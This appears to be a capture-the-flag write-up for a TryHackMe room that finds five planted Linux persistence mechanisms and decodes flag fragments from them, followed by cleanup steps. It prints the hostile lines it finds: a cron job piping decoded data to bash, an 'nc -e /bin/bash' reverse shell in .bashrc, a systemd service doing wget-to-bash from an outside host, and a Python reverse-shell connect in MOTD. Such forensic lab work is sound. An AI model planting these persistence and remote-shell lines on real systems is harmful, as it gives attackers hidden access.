# THM-Hide_and_seek

## Summary

The adversary left behind a taunting note hinting at multiple persistence mechanisms planted across the system. Each mechanism contained a clue forming part of a final flag. The goal was to identify all persistence methods and piece together the flag.

**Final Flag:** `THM{[REDACTED]}`

---

## Persistence Mechanisms & Clue Extraction

### 1. Cron Job - "Time is on my side..."

**Path:** `/etc/crontab`

```bash
* * * * * /bin/bash -c 'echo [REDACTED_BASE64] | base64 -d | bash 2>/dev/null'
```

**Decoded base64 (redacted):** `[REDACTED]`

**Decoded subdomain (hex):**

```bash
echo [REDACTED_HEX] | xxd -r -p  # [REDACTED_FLAG_PART_1]
```

**Clue 1:** `[REDACTED_FLAG_PART_1]`

---

### 2. SSH Backdoor - "A secret handshake..."

**Path:** `/home/zeroday/.ssh/.authorized_keys`

Contained an ECDSA key with a suspicious hex comment:

```
[REDACTED_HEX_COMMENT]
```

**Decoded comment (hex):**

```bash
echo [REDACTED_HEX] | xxd -r -p  # [REDACTED_FLAG_PART_2]
```

**Clue 2:** `[REDACTED_FLAG_PART_2]`

---

### 3. .bashrc Reverse Shell - "Whenever you set the stage..."

**Path:** `/home/*/.bashrc`

```bash
nc -e /bin/bash [REDACTED_HEX].cipher.io 443 2>/dev/null
```

**Decoded subdomain (hex):**

```bash
echo [REDACTED_HEX] | xxd -r -p  # [REDACTED_BASE64]
```

**Base64 decode:**

```bash
echo [REDACTED_BASE64] | base64 -d  # [REDACTED_FLAG_PART_3]
```

**Clue 3:** `[REDACTED_FLAG_PART_3]`

---

### 4. Systemd Service - "I run with the big dogs..."

**Path:** `/usr/lib/systemd/system/cipher.service`

```ini
[Service]
ExecStart=/bin/bash -c 'wget [REDACTED_BASE64].s1mpl3bd.com --output - | bash 2>/dev/null'
```

**Decoded payload (base64):**

```bash
echo [REDACTED_BASE64] | base64 -d  # [REDACTED_FLAG_PART_4]
```

**Clue 4:** `[REDACTED_FLAG_PART_4]`

---

### 5. MOTD Reverse Shell - "I love welcome messages."

**Path:** `/etc/update-motd.d/00-header`

Embedded Python reverse shell:

```python
s.connect(("[REDACTED_HEX].h1dd3nd00r.n3t",));
```

**Decoded hex:**

```bash
echo [REDACTED_HEX] | xxd -r -p  # [REDACTED_FLAG_PART_5]
```

**Clue 5:** `[REDACTED_FLAG_PART_5]`

---

## Final Flag Assembly

Combining all parts:

* `[REDACTED_FLAG_PART_1]`
* `[REDACTED_FLAG_PART_2]`
* `[REDACTED_FLAG_PART_3]`
* `[REDACTED_FLAG_PART_4]`
* `[REDACTED_FLAG_PART_5]`

**✅ Final Flag:** `THM{[REDACTED]}`

---

## Cleanup Recommendations

1. Remove malicious cron jobs (`sudo crontab -e`)
2. Delete rogue `.authorized_keys` and suspicious users
3. Restore `.bashrc` to a safe state
4. Disable and remove `cipher.service`:

   ```bash
   sudo systemctl disable cipher.service
   sudo rm /usr/lib/systemd/system/cipher.service
   ```
5. Sanitize `/etc/update-motd.d/00-header`

---
